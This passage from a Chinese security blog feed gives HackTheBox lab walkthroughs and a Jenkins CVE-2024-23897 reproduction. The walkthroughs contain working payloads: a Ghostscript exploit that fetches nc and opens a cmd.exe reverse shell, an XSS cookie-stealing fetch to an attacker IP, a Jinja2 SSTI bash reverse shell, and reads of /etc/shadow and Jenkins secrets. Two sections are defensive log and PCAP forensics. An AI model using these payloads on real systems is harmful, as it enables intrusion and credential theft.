<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x initdb.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>最后sudo执行<code>/usr/bin/syscheck</code>，成功运行sh脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/syscheck</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/article/Headless-HackTheBox/image-20240331181954932.png"></p>
<p>运行sh脚本后，用-p参数启动<code>Bash Shell</code>并以特权模式运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>

<p>得到root的flag</p>
<p><img src="/article/Headless-HackTheBox/image-20240331182210478.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Hospital-HackTheBox</title>
    <url>/article/Hospital-HackTheBox.html</url>
    <content><![CDATA[<p>Ubuntu内核版本漏洞提权、CVE-2023-36664</p>
<span id="more"></span>

<h1 id="Hospital-HackTheBox"><a href="#Hospital-HackTheBox" class="headerlink" title="Hospital-HackTheBox"></a>Hospital-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
<p><img src="/article/Hospital-HackTheBox/image-20240112180806750.png"></p>
<p>发现8080端口和443端口有http服务</p>
<p>然后发现3389端口是启用了ms-wbt-server服务</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115204915296.png"></p>
<p>在对443端口的扫描没有收获，并且只有邮箱登录界面无法注册</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115164807440.png"></p>
<p>接着看向8080端口，我们随便注册用户登录后发现有文件上传功能</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115164932259.png"></p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>经过测试pht和phar后缀都可以绕过检测，然后dirsearch扫描出文件上传路径为<code>/uploads/</code></p>
<p>尝试上传一句话木马，发现虽然能成功但是并不能执行命令</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115165831471.png"></p>
<p>于是借助大神写的shell工具来反弹shell <a href="https://github.com/flozz/p0wny-shell">脚本链接</a></p>
<p>直接下载shell.php然后上传，用bp将php后缀改为phar（后面测试了一下发现pht后缀会有问题，只能显示源码不解析）</p>
<p>然后访问文件保存路径<code>/uploads/shell.phar</code></p>
<p><img src="/article/Hospital-HackTheBox/image-20240115171307639.png"></p>
<p>由于不稳定我们反弹到本地机器上</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115171656947.png"></p>
<p>经过一番搜索，在<code>/var/ww/html/config.php</code>找到数据库用户和密码</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115172212732.png"></p>
<p>然后连接数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p -h localhost</span><br></pre></td></tr></table></figure>

<p>找到用户信息</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115172643646.png"></p>
<p>对admin的解码一下得到密码（早知道弱口令爆破了hhh）</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115173020295.png"></p>
<p>不过好像没什么用</p>
<p>于是参考国外师傅wp原来是利用Ubuntu内核版本漏洞去提权 <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">exp链接</a></p>
<p>我们把exp下载到本地然后开启http服务，在靶机用wget命令复制过去</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115181536436.png"></p>
<p>然后chmod给个执行权限，成功提权</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115181701556.png"></p>
<p>这里的root并不是真正的root用户，所以我们还得寻找可用信息</p>
<p>我们查看当前用户的哈希值，发现有drwilliams的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>

<p><img src="/article/Hospital-HackTheBox/image-20240115182451909.png"></p>
<p>然后用john爆破得到密码</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115184235946.png"></p>
<p>得到密码后访问443端口登录后，注意到一封邮件</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115200651567.png"></p>
<p>谷歌翻译一下，应该是要给Brown发送.eps文件</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115200710233.png"></p>
<p>网上搜索出相关漏洞 <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">参考文章</a></p>
<blockquote>
<p>漏洞原理大概就是GPL PostScript&#x2F;PDF 解释器 Ghostscript 无法正确处理管道设备的权限验证，如果处理格式错误的文档文件，可能会导致执行任意命令</p>
</blockquote>
<p>我们可以这样利用，先用该exp去创建第一个<code>.eps</code>文件构造curl命令我们本地的nc程序，然后Brown使用解释器打开后触发该命令下载nc程序；然后再次发送一个<code>.eps</code>文件去利用nc执行主动弹shell的命令</p>
<p>注意被攻击机为Brown的windows系统</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115201559484.png"></p>
<p>执行过程如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE_2023_36664_exploit.py --inject --payload &quot;curl 10.10.14.54:8000/nc64.exe -o nc.exe&quot; --filename file.eps</span><br></pre></td></tr></table></figure>

<p>下载nc64.exe并保存为nc.exe</p>
<p>成功下载nc程序<img src="/article/Hospital-HackTheBox/image-20240115202041934.png"></p>
<p>然后就再发一个邮件去主动nc连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE_2023_36664_exploit.py --inject --payload &quot;nc.exe 10.10.14.54 1028 -e cmd.exe&quot; --filename file.eps</span><br></pre></td></tr></table></figure>

<p>发送后被Brown打开，成功nc连接</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115204415877.png"></p>
<p>然后dir找到文件，查看一下得到密码</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115204646134.png"></p>
<p>由于我们前面namp扫描出3389端口是ms-wbt-server服务，我们就可以尝试连接一下</p>
<p>开始我是使用xfreerdp工具连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /u:drbrown /v:10.10.11.241</span><br></pre></td></tr></table></figure>

<p>然后惊讶的发现直接连接到被攻击机</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115210010248.png"></p>
<p>访问桌面得到user的flag（不过确实不太方便root提权）</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>所以就换成rpcclient连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient -U drbrown 10.10.11.241</span><br></pre></td></tr></table></figure>

<p>然后执行querydispinfo命令，查看关于当前连接到计算机的显示器的详细信息</p>
<p>注意到管理员信息是与访客共享的</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115211414355.png"></p>
<p>那么我们可以在刚刚连接的windows靶机上，curl我们本地的shell文件来实现RCE</p>
<p>（shell.php前文已经给了参考链接）</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115212041160.png"></p>
<p>由于知道是共享的，所以我们直接访问<code>/shell.php</code>得到root的flag</p>
<p><img src="/article/Hospital-HackTheBox/image-20240115211953335.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>IClean-HackTheBox</title>
    <url>/article/IClean-HackTheBox.html</url>
    <content><![CDATA[<p>XSS跨站脚本攻击、SSTI模板注入</p>
<span id="more"></span>

<h1 id="IClean-HackTheBox"><a href="#IClean-HackTheBox" class="headerlink" title="IClean-HackTheBox"></a>IClean-HackTheBox</h1><p><strong>信息搜集</strong></p>
<p>nmap扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.12 -Pn</span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>访问80端口，发现跳转到<code>capiclean.htb</code>，添加下<code>/etc/hosts</code></p>
<p>扫描目录，可以发现<code>/dashboard</code>路由可以，应该是经过身份验证跳转到<code>/</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[22:00:12] 200 -    2KB - /about                                            </span><br><span class="line">[22:01:03] 302 -  189B  - /dashboard  -&gt;  /                                 </span><br><span class="line">[22:01:34] 200 -  711B  - /login                                            </span><br><span class="line">[22:01:35] 302 -  189B  - /logout  -&gt;  /                                    </span><br><span class="line">[22:02:15] 403 -  278B  - /server-status/                                   </span><br><span class="line">[22:02:16] 403 -  278B  - /server-status                                    </span><br><span class="line">[22:02:17] 200 -    8KB - /services</span><br></pre></td></tr></table></figure>

<p>我们在<code>/choose</code>路由下点击<code>get a quote</code></p>
<p><img src="/article/IClean-HackTheBox/image-20240517223255102.png"></p>
<p>勾选上去抓包，测试各个参数是否存在注入</p>
<p>在service参数成功测试出存在xss注入</p>
<p>（xss注入的payload均url编码过）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=http://10.10.14.54/&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/IClean-HackTheBox/image-20240517223604205.png"></p>
<p>我们尝试读取下管理员cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=fetch(&#x27;http://10.10.14.54/&#x27;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/IClean-HackTheBox/image-20240517223817967.png"></p>
<p>得到cookie后我们来验证一下，使用cookie成功访问<code>/dashboard</code></p>
<p><img src="/article/IClean-HackTheBox/image-20240517224029471.png"></p>
<p>我们按照<code>Generate Invoice =&gt; Generate QR</code>顺序</p>
<p>先生成<code>Invoice ID generated: 1223131481</code>，然后在第二步输入ID后点击<code>Genrate</code>会生成下面的<code>QR Code Link</code></p>
<p>我们抓包看看，注意到<code>qr_link</code>的值出现在img标签中</p>
<p><img src="/article/IClean-HackTheBox/image-20240517224817039.png"></p>
<p>经过测试该参数存在SSTI模板注入</p>
<p><img src="/article/IClean-HackTheBox/image-20240517224936946.png"></p>
<p>回显49应该就是Jinja2，直接payload测试一下（<code>__</code>直接unicode编码一下）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;id&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/IClean-HackTheBox/image-20240517230157254.png"></p>
<p>直接反弹shell（注意bash命令URL编码一下）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/1010.14.54/1028 0&gt;&amp;1&#x27;&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/IClean-HackTheBox/image-20240517230503070.png"></p>
<p>先提升下shell权限</p>
<p>然后在<code>/opt/app/app.py</code>找到数据库信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Database Configuration</span><br><span class="line">db_config = &#123;</span><br><span class="line">    &#x27;host&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;user&#x27;: &#x27;iclean&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;pxCsmnGLckUb&#x27;,</span><br><span class="line">    &#x27;database&#x27;: &#x27;capiclean&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接本地连接数据库<code>mysql -u iclean -p -h localhost</code>，找到consuela的密码</p>
<p><img src="/article/IClean-HackTheBox/image-20240517232043106.png"></p>
<p>先识别一下是什么加密，然后john爆破记得加上format</p>
<p><img src="/article/IClean-HackTheBox/image-20240517232013033.png"></p>
<p>拿到密码<code>simple and clean</code>后直接ssh连接就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh consuela@10.10.11.12</span><br></pre></td></tr></table></figure>

<p>拿到user的flag</p>
<p><img src="/article/IClean-HackTheBox/image-20240517232330110.png"></p>
<p>然后我们<code>sudo -l</code>查看下可用的命令</p>
<p><img src="/article/IClean-HackTheBox/image-20240517232526293.png"></p>
<p>用strings命令查看发现内容存在<code>--help</code>参数，网上搜索发现qpdf是一个内容转换工具，有对应的使用文档</p>
<p>我们可以利用其参数读取root的flag（注意要在tmp目录下才能下载root.txt）</p>
<p><img src="/article/IClean-HackTheBox/image-20240517233227496.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
    <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
    <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
<span id="more"></span>

<h1 id="Jenkins文件读取漏洞-CVE-2024-23897"><a href="#Jenkins文件读取漏洞-CVE-2024-23897" class="headerlink" title="Jenkins文件读取漏洞(CVE-2024-23897)"></a>Jenkins文件读取漏洞(CVE-2024-23897)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的是vulhub靶场的环境 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897">下载地址</a></p>
<p>cd进入目录下，依次执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>

<p>访问8080端口即可</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Jenkins提供了一个命令行的接口，用户可以下载一个命令行客户端<code>jenkins-cli.jar</code>到本地，并调用该客户端来执行一些Jenkins的功能。但是用户使用<code>jenkins-cli.jar</code>时，命令行是传到服务端解析的，而不是在jenkins-cli.jar里解析。这就导致一个问题，就是Jenkins服务端解析命令行时使用了一个第三方库<a href="https://github.com/kohsuke/args4j">args4j</a>，这个库实现了Linux中一个常见的功能——如果一个参数是以<code>@</code>开头，则会被自动认为是一个文件名，文件内容会被读取作为参数。所以就造成Jenkins文件读取漏洞。</p>
<blockquote>
<p>类似的还有PHP5.5以前，设置POST参数时，如果传入的参数值是<code>@</code>开头，则也会被认为是文件名，并读取该文件，造成文件读取漏洞。</p>
</blockquote>
<h2 id="Jenkins权限系统"><a href="#Jenkins权限系统" class="headerlink" title="Jenkins权限系统"></a>Jenkins权限系统</h2><p>正常情况下，cli这个功能的权限控制方案和Jenkins默认权限方案相同</p>
<p>Jenkins有几种鉴权方案：</p>
<ul>
<li><strong>Anyone can do anything</strong> 没有任何权限认证，匿名用户即可登录后台执行Groovy脚本</li>
<li><strong>Legacy Mode</strong> 旧鉴权模式</li>
<li><strong>Logged-in users can do anything</strong> 任意登录的用户可以做任何事，这是默认的权限选项</li>
<li><strong>Matrix-based security</strong> 细颗粒度权限控制，需要安装插件才支持这个鉴权模式</li>
</ul>
<p>默认安装后是第3种方案，非常简单，没有垂直权限的区分，登录后的用户就是管理员，没有登录的用户就是匿名用户。</p>
<p>这种权限方案中，管理员可以设置“匿名用户可读”选项：</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215237335.png"></p>
<p>这个选项在后台的<code>“Manage Jenkins” -&gt; “Security”</code>中管理员可以将其开启或关闭，默认是关闭的。实际测试中，如果我们访问Jenkins首页，发现强制跳转到登录页面，或者啥功能都没有直接报权限错误，就说明关闭了“匿名用户读”选项。</p>
<p>我们不妨测试一下关闭了匿名用户可读功能，那么大部分的cli命令也就无法调用，会出现<code>&quot;ERROR: anonymous is missing the Overall/Read permission&quot;</code>的错误：</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215426442.png"></p>
<p>但有2个命令例外，就是help和who-am-i。这两个命令是无需任何权限的，所以可以用来读取文件</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215733356.png"></p>
<p>在Vulhub环境中，“匿名用户可读”是开启的，某些Jenkins版本默认安装时可能也是开启的，但通常管理员会关闭这个功能。另外，大部分企业的Jenkins会安装<code>“Matrix-based security”</code>这样的插件来管理权限，也会影响“匿名用户可读”选项的值。总而言之，这个选项的开关取决于管理员是否想让未登录用户看到一些Jenkins的任务。</p>
<p>总结一下就是：</p>
<ul>
<li>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用</li>
<li>当Jenkins关闭了“匿名用户可读”功能，只有help和who-am-i命令可以被调用</li>
</ul>
<h2 id="如何读取想要的内容"><a href="#如何读取想要的内容" class="headerlink" title="如何读取想要的内容"></a>如何读取想要的内容</h2><p>前文已经知道了文件读取漏洞的原理，利用<code>jenkins-cli.jar</code>将命令传到服务端解析借助args4j库特性解析参数有<code>@</code>开头的文件</p>
<p>要实现任意文件读取，那么就需要返回文件读取后的内容。利用点是如果调用命令行的时候出错，args4j就会把错误返回给客户端而错误信息中就包含文件的内容。</p>
<p>这里p神提到，如果我们使用<code>@</code>将文件内容加载成命令行参数，那么我们读取文件的时候只能读到文件的前几行</p>
<p>比如使用help命令能读取前两行</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220700887.png"></p>
<p>使用keep-build命令，可以读取文件第3行</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220816201.png"></p>
<p>读取几行内容终究是不够，前文提到如果Jenkins开启了“匿名用户可读”选项，则大部分命令都可以被调用，其中包括<code>connect-node</code>命令和<code>reload-job</code>命令。这俩命令可以用来读取文件全部内容</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408221213026.png"></p>
<h2 id="Jenkins敏感文件"><a href="#Jenkins敏感文件" class="headerlink" title="Jenkins敏感文件"></a>Jenkins敏感文件</h2><p>如果部署Jenkins是Vulhub的Docker镜像，那么Jenkins的数据根目录是在<code>/var/jenkins_home</code>。但并不是所有人都会使用这个目录作为根目录，如果想读取Jenkins相关的文件，必须先知道Jenkins的根目录在哪里。这时可以读取<code>/proc/self/environ</code>也就是环境变量</p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222401625.png"></p>
<p>拿到了Jenkins的根目录，我们就可以来尝试读取下面这些敏感文件。</p>
<ul>
<li><code>/var/jenkins_home/users/*/config.xml</code> 保存所有用户的信息，包括密码、种子、Token等</li>
<li><code>/var/jenkins_home/secret.key</code> 保存Remember-Me Cookie中的一部分</li>
<li><code>/var/jenkins_home/secrets/master.key</code> 作为AES解密密钥</li>
<li><code>/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac</code> 作为计算hmac签名时的Key</li>
</ul>
<h3 id="读取用户密码"><a href="#读取用户密码" class="headerlink" title="读取用户密码"></a>读取用户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/users.xml&quot;</span><br></pre></td></tr></table></figure>

<p>得到用户名<code>admin_6382705393240952219</code></p>
<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222722527.png"></p>
<p>接着读取到用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/admin_6382705393240952219/config.xml&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222813856.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>跟着p神复现热门漏洞可以说是非常有收获，c1oudfl0w0师傅说RWCTF2024有道题考的就是这个漏洞，可惜当时没去打hhh</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Logjammer-HackTheBox</title>
    <url>/article/Logjammer-HackTheBox.html</url>
    <content><![CDATA[<p>多个Windows日志文件进行分析，不同的操作被记录在不同的日志并且对应的事件ID很重要，极大方便我们审计日志</p>
<span id="more"></span>



<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
<p>您有机会在一家大型咨询公司担任初级 DFIR 顾问。但是，他们提供了技术评估供您完成。咨询公司 Forela-Security 希望评估您对 Windows 事件日志分析的了解。请分析并报告他们提出的问题。</p>
</blockquote>
<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>用户 cyberjunkie 何时成功登录他的计算机？ （世界标准时间）</strong></p>
<p>题目附件有五个，其中记录Windows登录的日志文件为<code>Security.evtx</code></p>
<p>我们进行搜索找到cyberjunkie登录的时间，转换一下为<code>27/03/2023 14:37:09</code></p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422170139500.png"></p>
<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>用户篡改了系统上的防火墙设置。分析防火墙事件日志以找出添加的防火墙规则的名称？</strong></p>
<p>我们切换到<code>Windows Firewall-Firewall.evtx</code>日志文件，初步发现事件2004是修改&#x2F;添加规则的</p>
<p>那么我们在Windows系统下，使用工具EvtxeCmd将其转换成json格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./EvtxeCmd.exe -f D:\网安工具\取证\附件\Windows-Firewall-Firewall.evtx --json D:\网安工具\取证\附件</span><br></pre></td></tr></table></figure>

<p>然后使用jq命令筛选事件2004和查询PayloadData1字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 20240422094340_EvtxECmd_Output.json | D:\网安工具\取证\jq-1.7.1\jq -c &#x27;select(.EventId == 2004)&#x27; | D:\网安工具\取证\jq-1.7.1\jq -s &#x27;.[0] | [.PayloadData1]&#x27;</span><br></pre></td></tr></table></figure>

<p>得到添加的规则为<code>Metasploit C2 Bypass</code></p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422194553198.png"></p>
<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>防火墙规则的方向是什么？</strong></p>
<p>很明显是出站，英文就是outbound</p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422195244130.png"></p>
<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>用户更改了计算机的审计策略。这个更改策略的子类是什么？</strong></p>
<p>审计策略更改的日志 ID 为 <code>4719</code></p>
<p>子类为<code>Other Object Access Events</code></p>
<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>用户“cyberjunkie”创建了一个计划任务。这个任务的名字是什么？</strong></p>
<blockquote>
<p>在 Windows 操作系统中，创建计划任务的事件将被记录在 Windows 安全事件日志（Security Event Log）中，并使用事件 ID 4698</p>
</blockquote>
<p>直接筛选事件为4698，任务名为<code>HTB-AUTOMATION</code></p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422200633789.png"></p>
<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>为任务安排的文件的完整路径是什么？</strong></p>
<p>在前一题的TaskContent找到路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Desktop\Automation-HTB.ps1</span><br></pre></td></tr></table></figure>



<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>该命令的参数是什么？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A cyberjunkie@hackthebox.eu</span><br></pre></td></tr></table></figure>

<p><img src="/article/Logjammer-HackTheBox/image-20240422200911551.png"></p>
<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>系统上运行的防病毒软件识别出威胁并对其执行操作。哪个工具被防病毒软件识别为恶意软件？</strong></p>
<p>该操作是在<code>Windows Defender</code>日志文件下记录的，并且对应ID为1117、1003、1004、1116等</p>
<p>所以我们直接锁定到事件1117，发现恶意软件被警告</p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422201354285.png"></p>
<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>引发警报的恶意软件的完整路径是什么？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Downloads\SharpHound-v1.1.0.zip</span><br></pre></td></tr></table></figure>

<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>防病毒软件采取了什么行动？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quarantine  //隔离</span><br></pre></td></tr></table></figure>

<p><img src="/article/Logjammer-HackTheBox/image-20240422201658602.png"></p>
<h1 id="Task11"><a href="#Task11" class="headerlink" title="Task11"></a>Task11</h1><p><strong>用户使用Powershell执行命令。用户执行了什么命令？</strong></p>
<blockquote>
<p>一般情况下，用户在 PowerShell 中执行命令所生成的事件记录在 Windows 安全事件日志（Security Event Log）中的事件 ID 4104。</p>
</blockquote>
<p>直接切换到<code>Powershell-Operational</code>日志文件，然后筛选事件4104，找到执行的命令</p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422202108317.png"></p>
<h1 id="Task12"><a href="#Task12" class="headerlink" title="Task12"></a>Task12</h1><p><strong>我们怀疑用户删除了一些事件日志。哪个事件日志文件被清除？</strong></p>
<p>切换到System日志文件，找到被删除的日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft-Windows-Windows Firewall With Advanced Security/Firewall</span><br></pre></td></tr></table></figure>

<p><img src="/article/Logjammer-HackTheBox/image-20240422202827593.png"></p>
]]></content>
      <categories>
        <category>日志分析</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Meerkat-HackTheBox</title>
    <url>/article/Meerkat-HackTheBox.html</url>
    <content><![CDATA[<p>巨魔给的面试题，打开HTB的流量分析大门</p>
<span id="more"></span>

<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
<p>作为一家快速发展的初创公司，Forela 一直在利用业务管理平台。不幸的是，我们的文档很少，而且我们的管理员也不是最有安全意识的。作为我们新的安全提供商，我们希望您查看我们导出的一些 PCAP 和日志数据，以确认我们是否已（或尚未）受到损害。</p>
</blockquote>
<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>我们相信我们的业务管理平台服务器已受到损害。请确认正在运行的应用程序的名称？</strong></p>
<p>筛选http请求，然后追踪tcp流发现<code>/bonita/portal/homepage</code></p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418110808186.png"></p>
<p>很明显是和bonita有关，google搜索引擎得到答案为<code>bonitasoft</code></p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418110940647.png"></p>
<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>我们认为攻击者可能使用了暴力破解攻击类别的子集 - 所执行的攻击的名称是什么？</strong></p>
<p>经过查看后续的一些 http 包，可以发现产生了大量失败的登录请求，可以怀疑攻击者正在尝试进行凭据爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Credential Stuffing</span><br></pre></td></tr></table></figure>



<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>所利用的漏洞是否分配有 CVE - 如果有，是哪一个？</strong></p>
<p>查找一下是否有被命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p>可以发现在第1091个流出现命令执行，往前翻找到黑客上传zip文件进行攻击</p>
<p>那么肯定是通过此zip文件使得命令执行得到root权限</p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418111436776.png"></p>
<p>通过搜索引擎可以知道漏洞编号为<code>CVE-2022-25237</code></p>
